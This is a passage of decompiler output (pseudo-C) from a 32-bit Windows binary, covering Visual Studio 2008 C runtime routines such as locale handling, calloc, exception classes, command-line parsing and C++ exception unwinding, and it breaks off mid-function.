// Library: Visual Studio 2008 Release

LONG * __updatetlocinfoEx_nolock(void)

{
  LONG *pLVar1;
  LONG **in_EAX;
  LONG *unaff_EDI;
  
  if ((unaff_EDI != (LONG *)0x0) && (in_EAX != (LONG **)0x0)) {
    pLVar1 = *in_EAX;
    if (pLVar1 != unaff_EDI) {
      *in_EAX = unaff_EDI;
      ___addlocaleref(unaff_EDI);
      if (pLVar1 != (LONG *)0x0) {
        ___removelocaleref(pLVar1);
        if ((*pLVar1 == 0) && (pLVar1 != (LONG *)&DAT_0042bd10)) {
          ___freetlocinfo(pLVar1);
        }
      }
    }
    return unaff_EDI;
  }
  return (LONG *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetlocinfo
// 
// Library: Visual Studio 2008 Release

pthreadlocinfo __cdecl ___updatetlocinfo(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_0042bd04) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xc);
    __updatetlocinfoEx_nolock();
    FUN_00417124();
  }
  else {
    p_Var1 = __getptd();
    p_Var1 = (_ptiddata)p_Var1->ptlocinfo;
  }
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x20);
  }
  return (pthreadlocinfo)p_Var1;
}



void FUN_00417124(void)

{
  FUN_00412cbf(0xc);
  return;
}



// Library Function - Single Match
//  __towlower_l
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __towlower_l(wint_t _C,_locale_t _Locale)

{
  wchar_t *_DWMapFlag;
  wint_t wVar1;
  int iVar2;
  undefined2 in_stack_00000006;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ushort local_8 [2];
  
  wVar1 = 0xffff;
  if (_C != 0xffff) {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,_Locale);
    _DWMapFlag = (local_18.locinfo)->lc_category[0].wlocale;
    if (_DWMapFlag == (wchar_t *)0x0) {
      wVar1 = _C;
      if ((ushort)(_C - 0x41) < 0x1a) {
        wVar1 = _C + 0x20;
      }
    }
    else if (_C < 0x100) {
      iVar2 = __iswctype_l(_C,1,&local_18);
      wVar1 = _C;
      if (iVar2 != 0) {
        wVar1 = (wint_t)*(byte *)((int)local_18.locinfo[1].lc_category[0].wlocale + (__C & 0xffff));
      }
    }
    else {
      iVar2 = ___crtLCMapStringW((LPCWSTR)&local_18,(DWORD)_DWMapFlag,(LPCWSTR)0x100,(int)&_C,
                                 (LPWSTR)0x1,(int)local_8);
      wVar1 = _C;
      if (iVar2 != 0) {
        wVar1 = local_8[0];
      }
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return wVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __calloc_impl
// 
// Library: Visual Studio 2008 Release

int * __cdecl __calloc_impl(uint param_1,uint param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  uint *_Size;
  uint *dwBytes;
  
  if ((param_1 == 0) || (param_2 <= 0xffffffe0 / param_1)) {
    _Size = (uint *)(param_1 * param_2);
    dwBytes = _Size;
    if (_Size == (uint *)0x0) {
      dwBytes = (uint *)0x1;
    }
    do {
      piVar1 = (int *)0x0;
      if (dwBytes < (uint *)0xffffffe1) {
        if ((DAT_0046ec44 == 3) &&
           (dwBytes = (uint *)((int)dwBytes + 0xfU & 0xfffffff0), _Size <= DAT_0046ec50)) {
          __lock(4);
          piVar1 = ___sbh_alloc_block(_Size);
          FUN_004172e1();
          if (piVar1 != (int *)0x0) {
            _memset(piVar1,0,(size_t)_Size);
            goto LAB_00417296;
          }
        }
        else {
LAB_00417296:
          if (piVar1 != (int *)0x0) {
            return piVar1;
          }
        }
        piVar1 = (int *)HeapAlloc(DAT_0042d55c,8,(SIZE_T)dwBytes);
      }
      if (piVar1 != (int *)0x0) {
        return piVar1;
      }
      if (DAT_0042d878 == 0) {
        if (param_3 == (undefined4 *)0x0) {
          return (int *)0x0;
        }
        *param_3 = 0xc;
        return (int *)0x0;
      }
      iVar2 = __callnewh((size_t)dwBytes);
    } while (iVar2 != 0);
    if (param_3 != (undefined4 *)0x0) {
      *param_3 = 0xc;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0xc;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return (int *)0x0;
}



void FUN_004172e1(void)

{
  FUN_00412cbf(4);
  return;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &)
// 
// Library: Visual Studio 2008 Release

exception * __thiscall std::exception::exception(exception *this,char **param_1)

{
  size_t sVar1;
  char *_Dst;
  
  *(undefined ***)this = vftable;
  if (*param_1 == (char *)0x0) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    sVar1 = _strlen(*param_1);
    _Dst = (char *)_malloc(sVar1 + 1);
    *(char **)(this + 4) = _Dst;
    if (_Dst != (char *)0x0) {
      _strcpy_s(_Dst,sVar1 + 1,*param_1);
    }
  }
  *(undefined4 *)(this + 8) = 1;
  return this;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &,int)
// 
// Library: Visual Studio 2008 Release

void __thiscall std::exception::exception(exception *this,char **param_1,int param_2)

{
  char *pcVar1;
  
  *(undefined ***)this = vftable;
  pcVar1 = *param_1;
  *(undefined4 *)(this + 8) = 0;
  *(char **)(this + 4) = pcVar1;
  return;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(class std::exception const &)
// 
// Library: Visual Studio 2008 Release

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  int iVar1;
  size_t sVar2;
  char *pcVar3;
  
  *(undefined ***)this = vftable;
  iVar1 = *(int *)(param_1 + 8);
  *(int *)(this + 8) = iVar1;
  pcVar3 = *(char **)(param_1 + 4);
  if (iVar1 == 0) {
    *(char **)(this + 4) = pcVar3;
  }
  else if (pcVar3 == (char *)0x0) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    sVar2 = _strlen(pcVar3);
    pcVar3 = (char *)_malloc(sVar2 + 1);
    *(char **)(this + 4) = pcVar3;
    if (pcVar3 != (char *)0x0) {
      _strcpy_s(pcVar3,sVar2 + 1,*(char **)(param_1 + 4));
    }
  }
  return this;
}



// Library Function - Single Match
//  public: virtual __thiscall exception::~exception(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall exception::~exception(exception *this)

{
  *(undefined ***)this = std::exception::vftable;
  if (*(int *)(this + 8) != 0) {
    _free(*(void **)(this + 4));
  }
  return;
}



char * __fastcall FUN_004173e6(int param_1)

{
  char *pcVar1;
  
  pcVar1 = *(char **)(param_1 + 4);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "Unknown exception";
  }
  return pcVar1;
}



exception * __thiscall FUN_004173f3(void *this,byte param_1)

{
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040fb79(this);
  }
  return (exception *)this;
}



// Library Function - Single Match
//  __CxxThrowException@8
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __CxxThrowException_8(undefined4 param_1,byte *param_2)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD *pDVar3;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  undefined4 local_c;
  byte *local_8;
  
  pDVar2 = &DAT_004255bc;
  pDVar3 = local_24;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *pDVar3 = *pDVar2;
    pDVar2 = pDVar2 + 1;
    pDVar3 = pDVar3 + 1;
  }
  local_c = param_1;
  local_8 = param_2;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



// Library Function - Single Match
//  long __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  PEXCEPTION_RECORD pEVar1;
  ULONG_PTR UVar2;
  
  pEVar1 = param_1->ExceptionRecord;
  if (((pEVar1->ExceptionCode == 0xe06d7363) && (pEVar1->NumberParameters == 3)) &&
     ((UVar2 = pEVar1->ExceptionInformation[0], UVar2 == 0x19930520 ||
      (((UVar2 == 0x19930521 || (UVar2 == 0x19930522)) || (UVar2 == 0x1994000)))))) {
    terminate();
  }
  return 0;
}



// Library Function - Single Match
//  __XcptFilter
// 
// Library: Visual Studio 2008 Release

int __cdecl __XcptFilter(ulong _ExceptionNum,_EXCEPTION_POINTERS *_ExceptionPtr)

{
  ulong *puVar1;
  code *pcVar2;
  void *pvVar3;
  ulong uVar4;
  _ptiddata p_Var5;
  ulong *puVar6;
  int iVar7;
  int iVar8;
  
  p_Var5 = __getptd_noexit();
  if (p_Var5 != (_ptiddata)0x0) {
    puVar1 = (ulong *)p_Var5->_pxcptacttab;
    puVar6 = puVar1;
    do {
      if (*puVar6 == _ExceptionNum) break;
      puVar6 = puVar6 + 3;
    } while (puVar6 < puVar1 + DAT_0042be08 * 3);
    if ((puVar1 + DAT_0042be08 * 3 <= puVar6) || (*puVar6 != _ExceptionNum)) {
      puVar6 = (ulong *)0x0;
    }
    if ((puVar6 == (ulong *)0x0) || (pcVar2 = (code *)puVar6[2], pcVar2 == (code *)0x0)) {
      p_Var5 = (_ptiddata)0x0;
    }
    else if (pcVar2 == (code *)0x5) {
      puVar6[2] = 0;
      p_Var5 = (_ptiddata)0x1;
    }
    else {
      if (pcVar2 != (code *)0x1) {
        pvVar3 = p_Var5->_tpxcptinfoptrs;
        p_Var5->_tpxcptinfoptrs = _ExceptionPtr;
        if (puVar6[1] == 8) {
          if (DAT_0042bdfc < DAT_0042be00 + DAT_0042bdfc) {
            iVar7 = DAT_0042bdfc * 0xc;
            iVar8 = DAT_0042bdfc;
            do {
              *(undefined4 *)(iVar7 + 8 + (int)p_Var5->_pxcptacttab) = 0;
              iVar8 = iVar8 + 1;
              iVar7 = iVar7 + 0xc;
            } while (iVar8 < DAT_0042be00 + DAT_0042bdfc);
          }
          uVar4 = *puVar6;
          iVar8 = p_Var5->_tfpecode;
          if (uVar4 == 0xc000008e) {
            p_Var5->_tfpecode = 0x83;
          }
          else if (uVar4 == 0xc0000090) {
            p_Var5->_tfpecode = 0x81;
          }
          else if (uVar4 == 0xc0000091) {
            p_Var5->_tfpecode = 0x84;
          }
          else if (uVar4 == 0xc0000093) {
            p_Var5->_tfpecode = 0x85;
          }
          else if (uVar4 == 0xc000008d) {
            p_Var5->_tfpecode = 0x82;
          }
          else if (uVar4 == 0xc000008f) {
            p_Var5->_tfpecode = 0x86;
          }
          else if (uVar4 == 0xc0000092) {
            p_Var5->_tfpecode = 0x8a;
          }
          (*pcVar2)(8,p_Var5->_tfpecode);
          p_Var5->_tfpecode = iVar8;
        }
        else {
          puVar6[2] = 0;
          (*pcVar2)(puVar6[1]);
        }
        p_Var5->_tpxcptinfoptrs = pvVar3;
      }
      p_Var5 = (_ptiddata)0xffffffff;
    }
  }
  return (int)p_Var5;
}



// Library Function - Single Match
//  __wwincmdln
// 
// Library: Visual Studio 2008 Release

void __wwincmdln(void)

{
  ushort uVar1;
  bool bVar2;
  ushort *puVar3;
  
  bVar2 = false;
  puVar3 = DAT_0046fc98;
  if (DAT_0046fc98 == (ushort *)0x0) {
    puVar3 = &DAT_00426bb8;
  }
  do {
    uVar1 = *puVar3;
    if (uVar1 < 0x21) {
      if (uVar1 == 0) {
        return;
      }
      if (!bVar2) {
        for (; (*puVar3 != 0 && (*puVar3 < 0x21)); puVar3 = puVar3 + 1) {
        }
        return;
      }
    }
    if (uVar1 == 0x22) {
      bVar2 = !bVar2;
    }
    puVar3 = puVar3 + 1;
  } while( true );
}



// Library Function - Single Match
//  __wsetenvp
// 
// Library: Visual Studio 2008 Release

int __cdecl __wsetenvp(void)

{
  int iVar1;
  wchar_t **ppwVar2;
  wchar_t *_Dst;
  errno_t eVar3;
  wchar_t *pwVar4;
  int iVar5;
  size_t _Count;
  
  iVar5 = 0;
  pwVar4 = DAT_0042d094;
  if (DAT_0042d094 == (wchar_t *)0x0) {
    iVar5 = -1;
  }
  else {
    for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + iVar1 + 1) {
      if (*pwVar4 != L'=') {
        iVar5 = iVar5 + 1;
      }
      iVar1 = FUN_0041deb7(pwVar4);
    }
    ppwVar2 = (wchar_t **)__calloc_crt(iVar5 + 1,4);
    pwVar4 = DAT_0042d094;
    DAT_0042d0bc = ppwVar2;
    if (ppwVar2 == (wchar_t **)0x0) {
      iVar5 = -1;
    }
    else {
      for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + _Count) {
        iVar5 = FUN_0041deb7(pwVar4);
        _Count = iVar5 + 1;
        if (*pwVar4 != L'=') {
          _Dst = (wchar_t *)__calloc_crt(_Count,2);
          *ppwVar2 = _Dst;
          if (_Dst == (wchar_t *)0x0) {
            _free(DAT_0042d0bc);
            DAT_0042d0bc = (wchar_t **)0x0;
            return -1;
          }
          eVar3 = _wcscpy_s(_Dst,_Count,pwVar4);
          if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          }
          ppwVar2 = ppwVar2 + 1;
        }
      }
      _free(DAT_0042d094);
      DAT_0042d094 = (wchar_t *)0x0;
      *ppwVar2 = (wchar_t *)0x0;
      DAT_0046fc84 = 1;
      iVar5 = 0;
    }
  }
  return iVar5;
}



// Library Function - Single Match
//  _wparse_cmdline
// 
// Library: Visual Studio 2008 Release

void __thiscall _wparse_cmdline(void *this,short **param_1,int *param_2)

{
  bool bVar1;
  bool bVar2;
  short *in_EAX;
  short *psVar3;
  short sVar4;
  uint uVar5;
  int *unaff_EBX;
  
  bVar1 = false;
  *unaff_EBX = 0;
  *param_2 = 1;
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)this;
    param_1 = param_1 + 1;
  }
  do {
    if (*in_EAX == 0x22) {
      bVar1 = !bVar1;
      sVar4 = 0x22;
    }
    else {
      *unaff_EBX = *unaff_EBX + 1;
      if ((short *)this != (short *)0x0) {
        *(short *)this = *in_EAX;
        this = (void *)((int)this + 2);
      }
      sVar4 = *in_EAX;
      if (sVar4 == 0) goto LAB_004177a4;
    }
    in_EAX = in_EAX + 1;
  } while ((bVar1) || ((sVar4 != 0x20 && (sVar4 != 9))));
  if ((short *)this != (short *)0x0) {
    *(short *)((int)this + -2) = 0;
  }
LAB_004177a4:
  bVar1 = false;
  while (psVar3 = in_EAX, *in_EAX != 0) {
    for (; (*psVar3 == 0x20 || (*psVar3 == 9)); psVar3 = psVar3 + 1) {
    }
    if (*psVar3 == 0) break;
    if (param_1 != (short **)0x0) {
      *param_1 = (short *)this;
      param_1 = param_1 + 1;
    }
    *param_2 = *param_2 + 1;
    while( true ) {
      bVar2 = true;
      uVar5 = 0;
      for (; *psVar3 == 0x5c; psVar3 = psVar3 + 1) {
        uVar5 = uVar5 + 1;
      }
      in_EAX = psVar3;
      if (*psVar3 == 0x22) {
        if (((uVar5 & 1) == 0) && ((!bVar1 || (in_EAX = psVar3 + 1, *in_EAX != 0x22)))) {
          bVar2 = false;
          bVar1 = !bVar1;
          in_EAX = psVar3;
        }
        uVar5 = uVar5 >> 1;
      }
      while (uVar5 != 0) {
        uVar5 = uVar5 - 1;
        if ((short *)this != (short *)0x0) {
          *(short *)this = 0x5c;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      sVar4 = *in_EAX;
      if ((sVar4 == 0) || ((!bVar1 && ((sVar4 == 0x20 || (sVar4 == 9)))))) break;
      if (bVar2) {
        if ((short *)this != (short *)0x0) {
          *(short *)this = sVar4;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      psVar3 = in_EAX + 1;
    }
    if ((short *)this != (short *)0x0) {
      *(short *)this = 0;
      this = (void *)((int)this + 2);
    }
    *unaff_EBX = *unaff_EBX + 1;
  }
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)0x0;
  }
  *param_2 = *param_2 + 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetargv
// 
// Library: Visual Studio 2008 Release

int __cdecl __wsetargv(void)

{
  uint _Size;
  uint uVar1;
  short **ppsVar2;
  int iVar3;
  uint in_ECX;
  uint local_8;
  
  _DAT_0042dae8 = 0;
  local_8 = in_ECX;
  GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_0042d8e0,0x104);
  _DAT_0042d0c8 = &DAT_0042d8e0;
  _wparse_cmdline((void *)0x0,(short **)0x0,(int *)&local_8);
  uVar1 = local_8;
  if ((((local_8 < 0x3fffffff) && (in_ECX < 0x7fffffff)) &&
      (_Size = (in_ECX + local_8 * 2) * 2, in_ECX * 2 <= _Size)) &&
     (ppsVar2 = (short **)__malloc_crt(_Size), ppsVar2 != (short **)0x0)) {
    _wparse_cmdline(ppsVar2 + uVar1,ppsVar2,(int *)&local_8);
    _DAT_0042d0a8 = local_8 - 1;
    iVar3 = 0;
    _DAT_0042d0b0 = ppsVar2;
  }
  else {
    iVar3 = -1;
  }
  return iVar3;
}



// Library Function - Single Match
//  ___crtGetEnvironmentStringsW
// 
// Library: Visual Studio 2008 Release

LPVOID __cdecl ___crtGetEnvironmentStringsW(void)

{
  WCHAR WVar1;
  LPWCH _Src;
  WCHAR *pWVar2;
  WCHAR *pWVar3;
  size_t _Size;
  void *_Dst;
  
  _Src = GetEnvironmentStringsW();
  if (_Src != (LPWCH)0x0) {
    WVar1 = *_Src;
    pWVar3 = _Src;
    while (WVar1 != L'\0') {
      do {
        pWVar2 = pWVar3;
        pWVar3 = pWVar2 + 1;
      } while (*pWVar3 != L'\0');
      pWVar3 = pWVar2 + 2;
      WVar1 = *pWVar3;
    }
    _Size = (int)pWVar3 + (2 - (int)_Src);
    _Dst = __malloc_crt(_Size);
    if (_Dst != (void *)0x0) {
      _memcpy(_Dst,_Src,_Size);
    }
    FreeEnvironmentStringsW(_Src);
    return _Dst;
  }
  return (LPVOID)0x0;
}



LPWSTR GetCommandLineW(void)

{
  LPWSTR pWVar1;
  
                    // WARNING: Could not recover jumptable at 0x0041798a. Too many branches
                    // WARNING: Treating indirect jump as call
  pWVar1 = GetCommandLineW();
  return pWVar1;
}



// WARNING: Removing unreachable block (ram,0x004179a4)
// WARNING: Removing unreachable block (ram,0x004179aa)
// WARNING: Removing unreachable block (ram,0x004179ac)
// Library Function - Single Match
//  __RTC_Initialize
// 
// Library: Visual Studio 2008 Release

void __RTC_Initialize(void)

{
  return;
}



// Library Function - Single Match
//  ___security_init_cookie
// 
// Library: Visual Studio 2008 Release

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  LARGE_INTEGER local_14;
  _FILETIME local_c;
  
  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  if ((DAT_0042b0a0 == 0xbb40e64e) || ((DAT_0042b0a0 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_c);
    uVar4 = local_c.dwHighDateTime ^ local_c.dwLowDateTime;
    DVar1 = GetCurrentProcessId();
    DVar2 = GetCurrentThreadId();
    DVar3 = GetTickCount();
    QueryPerformanceCounter(&local_14);
    DAT_0042b0a0 = uVar4 ^ DVar1 ^ DVar2 ^ DVar3 ^ local_14.s.HighPart ^ local_14.s.LowPart;
    if (DAT_0042b0a0 == 0xbb40e64e) {
      DAT_0042b0a0 = 0xbb40e64f;
    }
    else if ((DAT_0042b0a0 & 0xffff0000) == 0) {
      DAT_0042b0a0 = DAT_0042b0a0 | DAT_0042b0a0 << 0x10;
    }
    DAT_0042b0a4 = ~DAT_0042b0a0;
  }
  else {
    DAT_0042b0a4 = ~DAT_0042b0a0;
  }
  return;
}



// Library Function - Single Match
//  _fastzero_I
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2019

void __cdecl _fastzero_I(undefined (*param_1) [16],uint param_2)

{
  uint uVar1;
  
  uVar1 = param_2 >> 7;
  do {
    *param_1 = (undefined  [16])0x0;
    param_1[1] = (undefined  [16])0x0;
    param_1[2] = (undefined  [16])0x0;
    param_1[3] = (undefined  [16])0x0;
    param_1[4] = (undefined  [16])0x0;
    param_1[5] = (undefined  [16])0x0;
    param_1[6] = (undefined  [16])0x0;
    param_1[7] = (undefined  [16])0x0;
    param_1 = param_1 + 8;
    uVar1 = uVar1 - 1;
  } while (uVar1 != 0);
  return;
}



// Library Function - Single Match
//  __VEC_memzero
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

undefined (*) [16] __cdecl __VEC_memzero(undefined (*param_1) [16],undefined4 param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  undefined *puVar4;
  undefined (*pauVar5) [16];
  
  uVar2 = (int)param_1 >> 0x1f;
  iVar3 = (((uint)param_1 ^ uVar2) - uVar2 & 0xf ^ uVar2) - uVar2;
  if (iVar3 == 0) {
    uVar2 = param_3 & 0x7f;
    if (param_3 != uVar2) {
      _fastzero_I(param_1,param_3 - uVar2);
    }
    if (uVar2 != 0) {
      puVar4 = (undefined *)((int)param_1 + (param_3 - uVar2));
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
    }
  }
  else {
    iVar3 = 0x10 - iVar3;
    pauVar5 = param_1;
    for (iVar1 = iVar3; iVar1 != 0; iVar1 = iVar1 + -1) {
      (*pauVar5)[0] = 0;
      pauVar5 = (undefined (*) [16])(*pauVar5 + 1);
    }
    __VEC_memzero((undefined (*) [16])((int)param_1 + iVar3),0,param_3 - iVar3);
  }
  return param_1;
}



// Library Function - Single Match
//  public: __thiscall std::bad_exception::bad_exception(char const *)
// 
// Library: Visual Studio 2008 Release

bad_exception * __thiscall std::bad_exception::bad_exception(bad_exception *this,char *param_1)

{
  exception::exception((exception *)this,&param_1);
  *(undefined ***)this = vftable;
  return this;
}



undefined4 * __thiscall FUN_00417b81(void *this,byte param_1)

{
  *(undefined ***)this = std::bad_exception::vftable;
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040fb79(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___TypeMatch
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl ___TypeMatch(byte *param_1,byte *param_2,uint *param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((iVar1 == 0) || (*(char *)(iVar1 + 8) == '\0')) {
LAB_00417c00:
    uVar2 = 1;
  }
  else {
    if (iVar1 == *(int *)(param_2 + 4)) {
LAB_00417bdf:
      if (((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&
          (((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)))) &&
         (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))) goto LAB_00417c00;
    }
    else {
      iVar1 = _strcmp((char *)(iVar1 + 8),(char *)(*(int *)(param_2 + 4) + 8));
      if (iVar1 == 0) goto LAB_00417bdf;
    }
    uVar2 = 0;
  }
  return uVar2;
}



// Library Function - Single Match
//  ___FrameUnwindFilter
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl ___FrameUnwindFilter(int **param_1)

{
  _ptiddata p_Var1;
  
  if (**param_1 == -0x1fbcb0b3) {
    p_Var1 = __getptd();
    if (0 < p_Var1->_ProcessingThrow) {
      p_Var1 = __getptd();
      p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
    }
  }
  else if (**param_1 == -0x1f928c9d) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = 0;
    terminate();
    return p_Var1;
  }
  return (_ptiddata)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___FrameUnwindToState
// 
// Library: Visual Studio 2008 Release

void __cdecl ___FrameUnwindToState(int param_1,undefined4 param_2,int param_3,int param_4)

{
  _ptiddata p_Var1;
  int iVar2;
  int *piVar3;
  int iVar4;
  
  if (*(int *)(param_3 + 4) < 0x81) {
    iVar4 = (int)*(char *)(param_1 + 8);
  }
  else {
    iVar4 = *(int *)(param_1 + 8);
  }
  p_Var1 = __getptd();
  p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + 1;
  while (iVar4 != param_4) {
    if ((iVar4 < 0) || (*(int *)(param_3 + 4) <= iVar4)) {
      _inconsistency();
    }
    iVar2 = iVar4 * 8;
    piVar3 = (int *)(*(int *)(param_3 + 8) + iVar2);
    iVar4 = *piVar3;
    if (piVar3[1] != 0) {
      *(int *)(param_1 + 8) = iVar4;
      __CallSettingFrame_12(*(undefined4 *)(*(int *)(param_3 + 8) + 4 + iVar2),param_1,0x103);
    }
  }
  FUN_00417d16();
  if (iVar4 != param_4) {
    _inconsistency();
  }
  *(int *)(param_1 + 8) = iVar4;
  return;
}



void FUN_00417d16(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (0 < p_Var1->_ProcessingThrow) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___DestructExceptionObject
// 
// Library: Visual Studio 2008 Release

void __cdecl ___DestructExceptionObject(int *param_1)

{
  undefined *UNRECOVERED_JUMPTABLE;
  
  if ((((param_1 != (int *)0x0) && (*param_1 == -0x1f928c9d)) && (param_1[7] != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(undefined **)(param_1[7] + 4),
     UNRECOVERED_JUMPTABLE != (undefined *)0x0)) {
    FID_conflict__CallMemberFunction1(param_1[6],UNRECOVERED_JUMPTABLE);
  }
  return;
}



// Library Function - Single Match
//  ___AdjustPointer
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl ___AdjustPointer(int param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = *param_2 + param_1;
  if (-1 < param_2[1]) {
    iVar1 = iVar1 + *(int *)(*(int *)(param_2[1] + param_1) + param_2[2]) + param_2[1];
  }
  return iVar1;
}



// Library Function - Single Match
//  unsigned char __cdecl IsInExceptionSpec(struct EHExceptionRecord *,struct _s_ESTypeList const *)
// 
// Library: Visual Studio 2008 Release

uchar __cdecl IsInExceptionSpec(EHExceptionRecord *param_1,_s_ESTypeList *param_2)

{
  int iVar1;
  byte *pbVar2;
  byte **ppbVar3;
  int *unaff_EDI;
  int local_c;
  uchar local_5;
  
  if (unaff_EDI == (int *)0x0) {
    _inconsistency();
    terminate();
  }
  local_c = 0;
  local_5 = '\0';
  if (0 < *unaff_EDI) {
    do {
      ppbVar3 = *(byte ***)(*(int *)(param_1 + 0x1c) + 0xc);
      pbVar2 = *ppbVar3;
      if (0 < (int)pbVar2) {
        do {
          ppbVar3 = ppbVar3 + 1;
          iVar1 = ___TypeMatch((byte *)(unaff_EDI[1] + local_c * 0x10),*ppbVar3,
                               *(uint **)(param_1 + 0x1c));
          if (iVar1 != 0) {
            local_5 = '\x01';
            break;
          }
          pbVar2 = pbVar2 + -1;
        } while (0 < (int)pbVar2);
      }
      local_c = local_c + 1;
    } while (local_c < *unaff_EDI);
  }
  return local_5;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3

void FUN_00417e6f(void *param_1)

{
  code *pcVar1;
  _ptiddata p_Var2;
  
  p_Var2 = __getptd();
  if (p_Var2->_curexcspec != (void *)0x0) {
    _inconsistency();
  }
  FUN_0041884a();
  terminate();
  p_Var2 = __getptd();
  p_Var2->_curexcspec = param_1;
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void Catch_All_00417ea0(void)

{
  code *pcVar1;
  _ptiddata p_Var2;
  int unaff_EBP;
  
  p_Var2 = __getptd();
  p_Var2->_curexcspec = *(void **)(unaff_EBP + 8);
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  void * __cdecl CallCatchBlock(struct EHExceptionRecord *,struct EHRegistrationNode *,struct
// _CONTEXT *,struct _s_FuncInfo const *,void *,int,unsigned long)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
CallCatchBlock(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,
              _s_FuncInfo *param_4,void *param_5,int param_6,ulong param_7)

{
  _ptiddata p_Var1;
  void *in_ECX;
  undefined4 local_40 [2];
  undefined4 local_38;
  void *local_34;
  void *local_30;
  undefined4 *local_2c;
  undefined4 local_28;
  void *local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00429570;
  uStack_c = 0x417ec4;
  local_38 = 0;
